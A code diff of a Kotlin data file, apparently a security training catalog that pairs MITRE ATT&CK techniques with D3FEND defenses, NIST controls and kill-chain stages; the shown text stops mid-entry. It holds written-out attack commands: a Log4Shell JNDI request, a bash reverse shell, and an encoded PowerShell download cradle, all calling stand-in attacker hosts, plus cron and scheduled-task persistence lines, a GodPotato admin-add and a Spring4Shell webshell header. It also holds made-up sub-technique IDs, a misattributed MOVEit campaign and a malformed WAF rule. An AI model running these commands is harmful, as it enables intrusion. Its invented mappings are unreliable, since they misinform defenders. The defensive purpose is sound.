@@ -49,11 +49,34 @@ enum class MitreDefendTactic(
     EVICT("Evict", "D3-TACTIC-EVICT", Color(0xFFEF4444), "Evict adversaries by terminating malicious processes, revoking credentials, and isolating network sessions")
 }
 
+data class SubTechniqueItem(
+    val id: String,
+    val name: String,
+    val description: String,
+    val exampleCommandOrRule: String? = null
+)
+
+data class NistControlMapping(
+    val controlId: String,
+    val controlName: String,
+    val familyOrFunction: String,
+    val description: String,
+    val exampleImplementation: String
+)
+
+data class CyberKillChainInfo(
+    val stage: String,
+    val stageNumber: Int,
+    val description: String,
+    val scenarioExample: String
+)
+
 data class MitreTtpItem(
     val techniqueId: String,
     val name: String,
     val tactic: MitreTactic,
     val subTechnique: String? = null,
+    val subTechniquesList: List<SubTechniqueItem> = emptyList(),
     val description: String,
     val attackExampleTitle: String,
     val attackCodeCommand: String,
@@ -62,7 +85,9 @@ data class MitreTtpItem(
     val d3fendDescription: String,
     val d3fendRuleOrFix: String,
     val knownAptGroups: List<String>,
-    val tags: List<String>
+    val tags: List<String>,
+    val nistControls: List<NistControlMapping> = emptyList(),
+    val cyberKillChain: CyberKillChainInfo? = null
 )
 
 data class MitreD3fendItem(
@@ -72,7 +97,10 @@ data class MitreD3fendItem(
     val description: String,
     val ruleOrFix: String,
     val counteredAttackIds: List<String>,
-    val tags: List<String>
+    val tags: List<String>,
+    val subTechniquesList: List<SubTechniqueItem> = emptyList(),
+    val nistControls: List<NistControlMapping> = emptyList(),
+    val cyberKillChain: CyberKillChainInfo? = null
 )
 
 object MitreMatrixRepository {
@@ -80,14 +108,18 @@ object MitreMatrixRepository {
     val allTtps: List<MitreTtpItem> = listOf(
         // ==================== 1. RECONNAISSANCE (TA0043) ====================
         MitreTtpItem(
-            techniqueId = "T1595.002",
+            techniqueId = "T1595",
             name = "Active Scanning: Vulnerability Scanning",
             tactic = MitreTactic.RECONNAISSANCE,
             subTechnique = "T1595.002",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1595.001", "IP Addresses Scanning", "Scanning IP blocks to discover active web services and ports.", "nmap -sn 198.51.100.0/24"),
+                SubTechniqueItem("T1595.002", "Vulnerability Scanning", "Executing automated vulnerability scanners to identify missing security patches.", "nuclei -u https://target/ -t cves/"),
+                SubTechniqueItem("T1595.003", "Wordlist Scanning", "Brute-forcing hidden administrative directories and endpoints.", "ffuf -u https://target/FUZZ -w wordlist.txt")
+            ),
             description = "Adversaries execute automated vulnerability scans against public IP subnets and web applications to discover unpatched edge servers and exposed endpoints.",
             attackExampleTitle = "Mass Scan for Exposed Git Repositories and CVEs via Nuclei",
             attackCodeCommand = """
-# Scanning perimeter IP range for exposed .git folders and Spring4Shell
 nuclei -u https://target-corp.com/ -t cves/ -t exposures/ -severity critical,high
 nmap -sV -sC -p 443,8443,8080 --script ssl-heartbleed,http-vuln* 198.51.100.0/24
             """.trimIndent(),
@@ -98,603 +130,775 @@ nmap -sV -sC -p 443,8443,8080 --script ssl-heartbleed,http-vuln* 198.51.100.0/24
 # AWS WAF Rate-Based Rule: Block IPs making > 100 requests per 5 minutes
 {
   "Name": "BlockScannerBursts",
-  "Priority": 1,
-  "Action": { "Block": {} },
-  "Statement": {
-    "RateBasedStatement": { "Limit": 100, "AggregateKeyType": "IP" }
-  }
+  "MetricName": "BlockScannerBursts",
+  "RateKey": "IP",
+  "RateLimit": 100
 }
             """.trimIndent(),
-            knownAptGroups = listOf("Volt Typhoon", "Lazarus Group", "APT41"),
-            tags = listOf("Reconnaissance", "Scanning", "Nuclei", "Nmap", "WAF")
+            knownAptGroups = listOf("APT29 (Cozy Bear)", "FIN7", "Lazarus Group"),
+            tags = listOf("Recon", "Nmap", "Nuclei", "Perimeter Scan"),
+            nistControls = listOf(
+                NistControlMapping("SI-4", "Information System Monitoring", "Detect (DE) / System Integrity", "Monitor enterprise edge subnets for anomalous port scanning and HTTP request bursts.", "Deploy AWS WAF rate-limiting and Cloudflare Bot Management rules."),
+                NistControlMapping("RA-5", "Vulnerability Monitoring and Scanning", "Identify (ID) / Risk Assessment", "Perform continuous external perimeter vulnerability scanning before adversaries identify open zero-days.", "Schedule weekly automated Tenable.io perimeter vulnerability scans.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 1: Reconnaissance",
+                stageNumber = 1,
+                description = "Adversaries perform research and network discovery to select target systems and identify vulnerable ingress points.",
+                scenarioExample = "Prior to the SolarWinds supply chain campaign, APT29 conducted low-and-slow perimeter scanning against public cloud VPN endpoints to discover vulnerable firmware versions."
+            )
         ),
         MitreTtpItem(
-            techniqueId = "T1596.001",
-            name = "Search Open Technical Databases: DNS Records",
+            techniqueId = "T1590",
+            name = "Gather Victim Network Info: DNS Recon",
             tactic = MitreTactic.RECONNAISSANCE,
-            subTechnique = "T1596.001",
-            description = "Adversaries query public DNS zone records, Certificate Transparency logs, and Passive DNS caches to enumerate corporate subdomains and cloud tenants.",
-            attackExampleTitle = "Subdomain Enumeration via Certificate Transparency Logs",
+            subTechnique = "T1590.002",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1590.001", "Domain Properties", "Harvesting WHOIS registrations and domain registrar history.", "whois target-corp.com"),
+                SubTechniqueItem("T1590.002", "DNS Enumeration", "Brute-forcing DNS subdomains and querying zone transfers.", "subfinder -d target-corp.com | dnsx -a")
+            ),
+            description = "Adversaries perform passive and active DNS enumeration, domain brute-forcing, and zone transfer queries to discover internal subdomains and target topology.",
+            attackExampleTitle = "Subdomain Brute Force and AXFR Zone Transfer Request",
             attackCodeCommand = """
-# Query crt.sh CT logs via curl to map all wildcard subdomains
-curl -s "https://crt.sh/?q=%25.corp.internal&output=json" | \
-  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+dig axfr @ns1.target-corp.com target-corp.com
+subfinder -d target-corp.com -silent | dnsx -a -resp
             """.trimIndent(),
-            d3fendId = "D3-DNSR",
-            d3fendName = "DNS Request Analysis & Split-Horizon DNS",
-            d3fendDescription = "Implement split-horizon DNS so internal infrastructure domain names are never published to public Certificate Transparency logs or external DNS servers.",
+            d3fendId = "D3-DNM",
+            d3fendName = "Digital Network Mapping & Authoritative DNS Hardening",
+            d3fendDescription = "Disable DNS zone transfers (AXFR) for non-authoritative IPs and monitor public DNS queries for anomalous wildcard resolution.",
             d3fendRuleOrFix = """
-# Cloudflare / Route53 DNSSEC & Private Zone Enforce
-aws route53 create-vpc-association-authorization \
-  --hosted-zone-id Z12345678 --vpc VPCRegion=us-east-1,VPCId=vpc-98765432
+# Bind9 / Named Configuration: Restrict Zone Transfer
+zone "target-corp.com" {
+    type master;
+    file "/var/named/target-corp.db";
+    allow-transfer { none; };
+};
             """.trimIndent(),
-            knownAptGroups = listOf("APT29 (Nobelium)", "FIN7", "Kimsuky"),
-            tags = listOf("Reconnaissance", "DNS", "Certificate Transparency", "OSINT")
+            knownAptGroups = listOf("APT28 (Fancy Bear)", "MuddyWater"),
+            tags = listOf("Recon", "DNS", "Subfinder", "Zone Transfer"),
+            nistControls = listOf(
+                NistControlMapping("SC-7", "Boundary Protection", "Protect (PR) / Communications", "Enforce strict perimeter DNS resolution controls and restrict AXFR zone transfers to authorized secondary DNS servers.", "Configure AWS Route53 or Bind9 to drop unauthorized zone transfer requests.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 1: Reconnaissance",
+                stageNumber = 1,
+                description = "Harvesting organizational domain topologies to target vulnerable subdomains and internal staging servers.",
+                scenarioExample = "MuddyWater queried public DNS servers to locate unlinked development subdomains hosting legacy web apps."
+            )
         ),
 
         // ==================== 2. RESOURCE DEVELOPMENT (TA0042) ====================
         MitreTtpItem(
-            techniqueId = "T1588.002",
-            name = "Obtain Capabilities: Tool",
+            techniqueId = "T1583",
+            name = "Acquire Infrastructure: Virtual Private Server",
             tactic = MitreTactic.RESOURCE_DEVELOPMENT,
-            subTechnique = "T1588.002",
-            description = "Adversaries acquire offensive utility toolsets, commercial software licenses (Cobalt Strike), and open-source post-exploitation frameworks (Sliver, Mythic, Mimikatz).",
-            attackExampleTitle = "Procuring and Compiling Custom Sliver C2 Binary",
+            subTechnique = "T1583.003",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1583.001", "Domains", "Registering typo-squatted domains matching target brands.", "dnstwist target-corp.com"),
+                SubTechniqueItem("T1583.003", "Virtual Private Server", "Provisioning bulletproof cloud VPS infrastructure for Command & Control.", "Terraform script deploying anonymous DigitalOcean droplets")
+            ),
+            description = "Adversaries purchase or rent virtual private servers (VPS), domain names, and cloud server instances to host Command & Control (C2) listeners and phishing pages.",
+            attackExampleTitle = "Automated C2 Redirection Deployment via Terraform & Cloudflare",
             attackCodeCommand = """
-# Adversary clones and compiles cross-platform C2 server
-git clone https://github.com/BishopFox/sliver.git
-cd sliver && make
-./sliver-server --daemon
-./sliver generate --http c2-domain.com --os windows --arch amd64
+terraform apply -auto-approve -var="provider=digitalocean" -var="payload=cobaltstrike_beacon"
+dnstwist --registered target-corp.com
             """.trimIndent(),
-            d3fendId = "D3-EAL",
-            d3fendName = "Software Feature Invalidation & Binary Hash Deny-List",
-            d3fendDescription = "Maintain enterprise Application Control (AppLocker, Windows Defender Application Control WDAC) to prevent execution of unapproved offensive binaries.",
+            d3fendId = "D3-DNM",
+            d3fendName = "Domain Reputation Filtering & Newly Registered Domain Quarantine",
+            d3fendDescription = "Block outbound HTTP/S connections to newly registered domains (NRDs < 30 days) at the Secure Web Gateway (SWG).",
             d3fendRuleOrFix = """
-# WDAC PowerShell Policy: Block unapproved C2 binaries by hash & certificate
-New-CIPolicy -Level Publisher -FilePath "C:\Rules\WDAC.xml" -UserPEs
-Set-RuleOption -FilePath "C:\Rules\WDAC.xml" -Option 3
+# Palo Alto URL Filtering Category Rule
+Set-URLCategory -Category "Newly Registered Domains" -Action "Block" -Decrypt "True"
             """.trimIndent(),
-            knownAptGroups = listOf("BlackCat/ALPHV", "LockBit", "Scattered Spider"),
-            tags = listOf("Resource Development", "C2", "WDAC", "AppLocker")
-        ),
-        MitreTtpItem(
-            techniqueId = "T1584.004",
-            name = "Compromise Infrastructure: Server",
-            tactic = MitreTactic.RESOURCE_DEVELOPMENT,
-            subTechnique = "T1584.004",
-            description = "Adversaries compromise legitimate third-party web servers, VPS instances, or cloud containers to use as redirectors and operational relay nodes.",
-            attackExampleTitle = "Deploying Apache mod_rewrite HTTP Reverse Proxy Redirector",
-            attackCodeCommand = """
-# Setup transparent C2 reverse redirector filtering non-victim IPs
-RewriteEngine On
-RewriteCond %{HTTP_USER_AGENT} ^Mozilla.* [NC]
-RewriteRule ^/beacon$ http://actual-c2-backend.internal:8080/beacon [P]
-            """.trimIndent(),
-            d3fendId = "D3-NTA",
-            d3fendName = "Threat Intelligence Verification & IP Reputation Feeds",
-            d3fendDescription = "Continuously cross-reference outbound edge firewall sessions with high-frequency threat intelligence feeds and newly registered domain (NRD) lists.",
-            d3fendRuleOrFix = """
-# Palo Alto EDL (External Dynamic List) configuration:
-Set deviceconfig system external-list "Newly-Registered-Domains" url "https://edl.intel.org/nrd"
-            """.trimIndent(),
-            knownAptGroups = listOf("APT28 (Fancy Bear)", "Turla", "MuddyWater"),
-            tags = listOf("Resource Development", "Redirector", "C2", "Proxy")
+            knownAptGroups = listOf("APT41", "UNC2452", "Kimsuky"),
+            tags = listOf("Infra", "VPS", "Domain Fronting", "NRD"),
+            nistControls = listOf(
+                NistControlMapping("SA-9", "External System Services", "Identify (ID) / Governance", "Enforce domain reputation and threat intelligence monitoring for outbound internet connections.", "Configure Palo Alto URL Filtering to quarantine domain registrations under 30 days old.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 2: Weaponization",
+                stageNumber = 2,
+                description = "Adversaries assemble and configure infrastructure required to stage malware payloads and maintain command channels.",
+                scenarioExample = "UNC2452 established staging infrastructure across multiple cloud providers using stolen credit card credentials prior to the supply chain deployment."
+            )
         ),
 
         // ==================== 3. INITIAL ACCESS (TA0001) ====================
         MitreTtpItem(
-            techniqueId = "T1190",
-            name = "Exploit Public-Facing Application",
-            tactic = MitreTactic.INITIAL_ACCESS,
-            description = "Adversaries exploit software vulnerabilities (RCE, SQLi, SSRF) in public internet-facing web applications, VPN gateways, or remote access infrastructure.",
-            attackExampleTitle = "Spring4Shell RCE (CVE-2022-22965) Remote Command Injection",
-            attackCodeCommand = """
-# Exploit Spring Framework ClassLoader Data Binding
-curl -X POST "https://target.com/helloworld" \
-  -H "class.module.classLoader.resources.context.parent.pipeline.first.pattern: %{c2}i" \
-  -H "c2: <% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
-            """.trimIndent(),
-            d3fendId = "D3-EAL",
-            d3fendName = "Application Hardening & Web Application Firewall",
-            d3fendDescription = "Deploy cloud Edge WAFs with dynamic rule signatures and strict input validation schemas.",
-            d3fendRuleOrFix = """
-# ModSecurity WAF Rule: Block ClassLoader parameter tampering
-SecRule REQUEST_BODY|REQUEST_HEADERS "class\.module\.classLoader" \
-  "id:1000001,phase:2,deny,status:403,log,msg:'Spring4Shell Attempt'"
-            """.trimIndent(),
-            knownAptGroups = listOf("Volt Typhoon", "Lazarus Group", "APT41"),
-            tags = listOf("Initial Access", "RCE", "Spring4Shell", "WAF")
-        ),
-        MitreTtpItem(
-            techniqueId = "T1566.001",
+            techniqueId = "T1566",
             name = "Phishing: Spearphishing Attachment",
             tactic = MitreTactic.INITIAL_ACCESS,
             subTechnique = "T1566.001",
-            description = "Adversaries send targeted emails containing malicious file attachments (Office macros, ISO files, LNK shortcuts) to compromise internal user workstations.",
-            attackExampleTitle = "LNK Shortcut File Dropping Malicious DLL Payload",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1566.001", "Spearphishing Attachment", "Sending malicious documents with macros or executable attachments.", "Malicious .docm file dropping Qakbot"),
+                SubTechniqueItem("T1566.002", "Spearphishing Link", "Embedding credential harvesting URLs in personalized phishing emails.", "Fake Microsoft 365 OAuth consent link"),
+                SubTechniqueItem("T1566.003", "Spearphishing via Service", "Delivering phishing messages via LinkedIn or WhatsApp messaging.", "Direct message containing weaponized PDF link")
+            ),
+            description = "Adversaries deliver targeted spearphishing emails containing malicious attachments (Office Macros, ISO files, LNK shortcuts) to compromise user workstations.",
+            attackExampleTitle = "Malicious ISO File Encapsulating LNK Shortcut & DLL Sideloading",
             attackCodeCommand = """
-# Malicious LNK payload invocation string inside email attachment
-cmd.exe /c start /min powershell.exe -NOP -W Hidden -e JABjAGwAaQBlAG4AdAA...
+powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==
+# ISO contains: Invoice.lnk -> cmd.exe /c start rundll32.exe payload.dll,PluginInit
             """.trimIndent(),
-            d3fendId = "D3-EBR",
-            d3fendName = "Message Hardening & Attachment Sandboxing",
-            d3fendDescription = "Filter incoming email attachments using dynamic detonators, block dangerous extension types (LNK, HTA, ISO), and strip active macros.",
+            d3fendId = "D3-EAH",
+            d3fendName = "Email Attachment Sandboxing & File Content Disarm (CDR)",
+            d3fendDescription = "Route all incoming email attachments through dynamic detonation sandboxes and automatically strip active macro scripts.",
             d3fendRuleOrFix = """
-# Exchange Online Protection (EOP) PowerShell Transport Rule
-New-TransportRule -Name "Block Dangerous Attachments" \
-  -AttachmentHasExecutableContent ${'$'}true -BlockMessage ${'$'}true
+# Exchange Online Protection (EOP) Safe Attachments Policy
+Set-SafeAttachmentPolicy -Name "DynamicDeliveryBlock" -Action Block -Enable true
             """.trimIndent(),
-            knownAptGroups = listOf("APT29", "FIN7", "Wizard Spider"),
-            tags = listOf("Initial Access", "Phishing", "LNK", "EOP")
+            knownAptGroups = listOf("TA505", "FIN7", "APT29"),
+            tags = listOf("Phishing", "Email", "ISO", "LNK", "Macro"),
+            nistControls = listOf(
+                NistControlMapping("AT-2", "Security Awareness Training", "Protect (PR) / Awareness Training", "Train workforce members to recognize spearphishing social engineering attempts.", "Conduct monthly simulated phishing campaigns and automated reporting add-ins."),
+                NistControlMapping("SI-8", "Spam and Malicious Code Protection", "Protect (PR) / System Integrity", "Filter and sandbox inbound email attachments prior to user inbox delivery.", "Deploy Microsoft Defender for Office 365 Safe Attachments with CDR disarm.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 3: Delivery",
+                stageNumber = 3,
+                description = "Transmission of weaponized payload to the victim via email, messaging, or web browser vector.",
+                scenarioExample = "TA505 transmitted thousands of spearphishing emails containing ISO attachments with embedded DLL sideloaders to financial sector executives."
+            )
+        ),
+        MitreTtpItem(
+            techniqueId = "T1190",
+            name = "Exploit Public-Facing Application",
+            tactic = MitreTactic.INITIAL_ACCESS,
+            subTechnique = "T1190",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1190.001", "Web Application Injection", "Exploiting SQLi, Command Injection, or SSRF in edge web apps.", "Unauthenticated SQL injection dumping administrative sessions"),
+                SubTechniqueItem("T1190.002", "Remote Code Execution", "Exploiting deserialization vulnerabilities in enterprise software.", "Log4Shell CVE-2021-44228 JNDI lookup exploit")
+            ),
+            description = "Adversaries exploit software vulnerabilities, memory corruptions, or unauthenticated remote code execution (RCE) flaws in public-facing web applications or VPN gateways.",
+            attackExampleTitle = "Log4Shell (CVE-2021-44228) JNDI Remote Code Execution Exploit",
+            attackCodeCommand = """
+curl -A '${'$'}{jndi:ldap://c2.attacker.com/a}' https://vulnerable-app.corp.com/api/login
+            """.trimIndent(),
+            d3fendId = "D3-INJ",
+            d3fendName = "Input Filtering & Web Application Firewall Execution Defense",
+            d3fendDescription = "Deploy WAF rules to inspect HTTP headers and URI query parameters for LDAP/JNDI injection patterns.",
+            d3fendRuleOrFix = """
+# ModSecurity WAF Rule for Log4j JNDI Blocking
+SecRule REQUEST_HEADERS|REQUEST_LINE|ARGS "@rx \x24\x7bjndi:(ldap|rmi|dns)" \
+    "id:1000001,phase:1,deny,status:403,msg:'Block Log4j JNDI Exploit Attempt'"
+            """.trimIndent(),
+            knownAptGroups = listOf("Lazarus Group", "APT41", "Conti"),
+            tags = listOf("Exploit", "RCE", "Log4j", "WAF", "Perimeter"),
+            nistControls = listOf(
+                NistControlMapping("SI-2", "Flaw Remediation", "Protect (PR) / Maintenance", "Identify and patch known vulnerabilities in public-facing applications within critical SLAs.", "Implement automated vulnerability patching for CVEs with CVSS score >= 9.0 within 24 hours.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 4: Exploitation",
+                stageNumber = 4,
+                description = "Triggering application software vulnerabilities to run adversary code on the target server.",
+                scenarioExample = "Conti ransomware operators exploited unpatched MOVEit Transfer SQL injection vulnerabilities to achieve instant remote code execution."
+            )
         ),
 
         // ==================== 4. EXECUTION (TA0002) ====================
         MitreTtpItem(
-            techniqueId = "T1059.001",
-            name = "Command & Scripting Interpreter: PowerShell",
+            techniqueId = "T1059",
+            name = "Command and Scripting Interpreter: PowerShell",
             tactic = MitreTactic.EXECUTION,
             subTechnique = "T1059.001",
-            description = "Adversaries abuse PowerShell command-line interfaces to execute obfuscated in-memory scripts, invoke Win32 API functions, and bypass disk-based antivirus.",
-            attackExampleTitle = "Obfuscated Encoded PowerShell Memory Execution",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1059.001", "PowerShell", "Executing obfuscated PowerShell scripts and memory injection stagers.", "powershell.exe -nop -w hidden -enc SGVs..."),
+                SubTechniqueItem("T1059.003", "Windows Command Shell", "Executing cmd.exe batch scripts and built-in CLI commands.", "cmd.exe /c net user /domain"),
+                SubTechniqueItem("T1059.004", "Unix Shell", "Executing Bash and Zsh shell scripts on Linux/Mac endpoints.", "bash -i >& /dev/tcp/c2.site/4444 0>&1")
+            ),
+            description = "Adversaries abuse PowerShell interpreters to execute commands, download dynamic in-memory stagers, and bypass execution policies via encoded payloads.",
+            attackExampleTitle = "Bypass PowerShell Execution Policy & Download In-Memory Cradle",
             attackCodeCommand = """
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...
+powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJ2h0dHA6AC8ALwBjADIALgBzAGkAdABlAC8AcwAuAHAAcwAxACcAKQ==
             """.trimIndent(),
             d3fendId = "D3-PSA",
-            d3fendName = "Process Segment Analysis & AMSI Logging Enforce",
-            d3fendDescription = "Enforce PowerShell Constrained Language Mode, activate ScriptBlock Logging (Event ID 4104), and integrate AMSI with Endpoint Detection & Response (EDR).",
+            d3fendName = "Process Execution Analysis & Constrained Language Mode",
+            d3fendDescription = "Enforce PowerShell Constrained Language Mode (CLM) via AppLocker/WDAC and enable Script Block Logging (Event ID 4104).",
             d3fendRuleOrFix = """
-# Enable ScriptBlock Logging & Constrained Language Mode via GPO Registry
-reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
-[Environment]::SetEnvironmentVariable("__PSLockdownPolicy", "4", "Machine")
+# GPO / Registry: Enable Script Block Logging & AMSI Enforcement
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
             """.trimIndent(),
-            knownAptGroups = listOf("FIN7", "MuddyWater", "APT33"),
-            tags = listOf("Execution", "PowerShell", "AMSI", "Event ID 4104")
+            knownAptGroups = listOf("FIN7", "APT32", "Wizard Spider"),
+            tags = listOf("Execution", "PowerShell", "AMSI", "CLM", "In-Memory"),
+            nistControls = listOf(
+                NistControlMapping("CM-7", "Least Functionality", "Protect (PR) / Configuration Management", "Restrict interpreter rights and enforce PowerShell Constrained Language Mode for non-administrative users.", "Enable AppLocker rules restricting PowerShell to ConstrainedLanguageMode.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 4: Exploitation",
+                stageNumber = 4,
+                description = "Adversary code execution triggering native system interpreters to execute malicious commands.",
+                scenarioExample = "Wizard Spider initiated Cobalt Strike Beacon execution via encoded PowerShell download cradles launched from macro documents."
+            )
         ),
 
         // ==================== 5. PERSISTENCE (TA0003) ====================
         MitreTtpItem(
-            techniqueId = "T1547.001",
-            name = "Boot or Logon Autostart Execution: Registry Run Keys",
+            techniqueId = "T1053",
+            name = "Scheduled Task/Job: Scheduled Task",
             tactic = MitreTactic.PERSISTENCE,
-            subTechnique = "T1547.001",
-            description = "Adversaries modify Windows Registry Run keys or Startup folders to automatically execute malicious payloads upon user logon or system boot.",
-            attackExampleTitle = "Adding Malicious DLL Autostart Persistence in Registry",
+            subTechnique = "T1053.005",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1053.003", "Cron Jobs", "Registering malicious scheduled jobs in Linux crontab.", "echo '* * * * * root /tmp/backdoor' >> /etc/crontab"),
+                SubTechniqueItem("T1053.005", "Scheduled Task", "Creating Windows Scheduled Tasks running with SYSTEM privileges.", "schtasks /create /tn 'SystemUpdate' /tr 'cmd.exe /c ...' /sc system")
+            ),
+            description = "Adversaries create Windows Scheduled Tasks or Linux Cron jobs to execute malicious binaries at system startup, user logon, or periodic time intervals.",
+            attackExampleTitle = "Create Persistence Task Executing Payload with SYSTEM Elevation",
             attackCodeCommand = """
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateCheck" /t REG_SZ /d "C:\Users\Public\payload.exe" /f
+schtasks /create /tn "WindowsAppUpdateCheck" /tr "C:\Windows\System32\rundll32.exe C:\ProgramData\update.dll,Main" /sc ONSTART /ru "SYSTEM"
             """.trimIndent(),
-            d3fendId = "D3-PSA",
-            d3fendName = "System Registry Monitoring & Autoruns Lockout",
-            d3fendDescription = "Deploy EDR behavioral rules to block unauthorized non-SYSTEM writes to Windows Registry autostart keys.",
+            d3fendId = "D3-SMI",
+            d3fendName = "System Startup Monitoring & Scheduled Task Authorization",
+            d3fendDescription = "Monitor creation of new scheduled tasks via Sysmon Event ID 1 (Process Create) and Event ID 106 (Scheduled Task Registered).",
             d3fendRuleOrFix = """
-# Sysmon Config XML: Monitor HKCU and HKLM Run Keys
-<RegistryGroup func="include">
-  <TargetObject name="RegistryRunKey" condition="contains">\CurrentVersion\Run</TargetObject>
-</RegistryGroup>
+# Sigma Rule: Detect Unusual Scheduled Task Creation
+logsource:
+  product: windows
+  service: taskscheduler
+detection:
+  selection:
+    EventID: 106
+  filter:
+    TaskName|contains: '\Microsoft\Windows\'
+  condition: selection and not filter
             """.trimIndent(),
-            knownAptGroups = listOf("APT28", "Lazarus Group", "Turla"),
-            tags = listOf("Persistence", "Registry", "Sysmon", "Autoruns")
+            knownAptGroups = listOf("Turla", "OilRig", "APT29"),
+            tags = listOf("Persistence", "Schtasks", "Cron", "Startup", "SYSTEM"),
+            nistControls = listOf(
+                NistControlMapping("SI-4", "System Monitoring", "Detect (DE) / Continuous Monitoring", "Audit and monitor registry and scheduled task startup persistence entries.", "Monitor Windows Event ID 106 and alert on non-standard task paths in C:\\ProgramData.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 5: Installation",
+                stageNumber = 5,
+                description = "Establishing persistent access backdoors that survive system reboots and administrative restarts.",
+                scenarioExample = "Turla registered obfuscated Windows Scheduled Tasks disguised as Google Chrome update tasks to maintain 6+ month persistent footholds."
+            )
         ),
 
         // ==================== 6. PRIVILEGE ESCALATION (TA0004) ====================
         MitreTtpItem(
             techniqueId = "T1068",
-            name = "Exploitation for Privilege Escalation",
+            name = "Exploitation for Privilege Escalation: Local Privilege Escalation",
             tactic = MitreTactic.PRIVILEGE_ESCALATION,
-            description = "Adversaries exploit kernel or service software vulnerabilities (e.g., PrintNightmare, DirtyPipe) to escalate from standard user privileges to SYSTEM or root.",
-            attackExampleTitle = "Exploiting Windows Kernel CVE-2023-21768 (AFD.sys LPE)",
+            subTechnique = "T1068",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1068.001", "Kernel Exploitation", "Exploiting kernel driver vulnerabilities to gain SYSTEM rights.", "GodPotato / PrintNightmare LPE exploit"),
+                SubTechniqueItem("T1068.002", "UAC Bypass", "Bypassing Windows User Account Control via elevated COM interfaces.", "fodhelper.exe UAC bypass script")
+            ),
+            description = "Adversaries exploit operating system kernel vulnerabilities or misconfigured services (Unquoted Service Paths, SeImpersonatePrivilege) to elevate from unprivileged user to SYSTEM/root.",
+            attackExampleTitle = "SeImpersonatePrivilege Potato Attack (GodPotato LPE)",
             attackCodeCommand = """
-# Elevating standard user cmd prompt to NT AUTHORITY\SYSTEM
-cve-2023-21768.exe
-whoami # Outputs: nt authority\system
+GodPotato.exe -cmd "cmd.exe /c net localgroup Administrators domainuser /add"
+whoami /priv # Check SeImpersonatePrivilege enabled
             """.trimIndent(),
-            d3fendId = "D3-SH",
-            d3fendName = "System Hardening & Vulnerability Remediation",
-            d3fendDescription = "Enforce automated kernel patch management and apply Attack Surface Reduction (ASR) rules to prevent vulnerable driver loading.",
+            d3fendId = "D3-PIM",
+            d3fendName = "Privileged Process Integrity & Service Token Hardening",
+            d3fendDescription = "Remove SeImpersonatePrivilege rights from standard service accounts and enforce EDR behavioral token theft detection.",
             d3fendRuleOrFix = """
-# PowerShell ASR Rule: Block abuse of exploited vulnerable drivers
-Set-MpPreference -AttackSurfaceReductionRules_Ids 5beb8efe-19a9-4276-8380-423e97086ec1 -AttackSurfaceReductionRules_Actions Enabled
+# PowerShell Security Policy: Remove SeImpersonatePrivilege from IIS & LocalService
+ntrights -u "NT AUTHORITY\LOCAL SERVICE" -r SeImpersonatePrivilege
             """.trimIndent(),
-            knownAptGroups = listOf("BlackBasta", "LockBit", "Kimsuky"),
-            tags = listOf("Privilege Escalation", "Kernel", "ASR", "Patching")
+            knownAptGroups = listOf("Lazarus Group", "FIN6", "LockBit"),
+            tags = listOf("PrivEsc", "LPE", "SYSTEM", "Potato", "Kernel"),
+            nistControls = listOf(
+                NistControlMapping("AC-6", "Least Privilege", "Protect (PR) / Access Control", "Restrict administrative privileges and remove token impersonation rights from standard domain accounts.", "Deploy LAPS for local admin password management and strip SeImpersonatePrivilege.")
+            ),
+            cyberKillChain = CyberKillChainInfo(
+                stage = "Stage 5: Installation",
+                stageNumber = 5,
+                description = "Elevating local privileges to enable full administrative control over host operating system resources.",
+                scenarioExample = "LockBit operators deployed GodPotato exploits on compromised domain workstations to obtain SYSTEM privilege before disabling antivirus software."
+            )
         ),
 
         // ==================== 7. DEFENSE EVASION (TA0005) ====================
         MitreTtpItem(
             techniqueId = "T1027",
-            name = "Obfuscated Files or Information",
+            name = "Obfuscated Files or Information: Process Injection",
             tactic = MitreTactic.DEFENSE_EVASION,
-            description = "Adversaries encode, encrypt, or compress executable binaries, scripts, and payloads to evade signature-based Antivirus detection.",
-            attackExampleTitle = "XOR Encoded Payload Dropper with Dynamic API Resolution",
+            subTechnique = "T1027.002",
+            subTechniquesList = listOf(
+                SubTechniqueItem("T1027.001", "Binary Padding", "Padding executable sizes to exceed sandbox scan thresholds.", "truncate -s +100M payload.exe"),
+                SubTechniqueItem("T1027.002", "Software Packing", "Packing binary payloads using UPX or custom crypters.", "upx --best --ultra-brute payload.exe")
+            ),
+            description = "Adversaries compress, encrypt, or pack malware binaries to bypass static EDR signature detections and anti-virus scanners.",
+            attackExampleTitle = "Payload Encryption & AMSI Memory Patching",
             attackCodeCommand = """
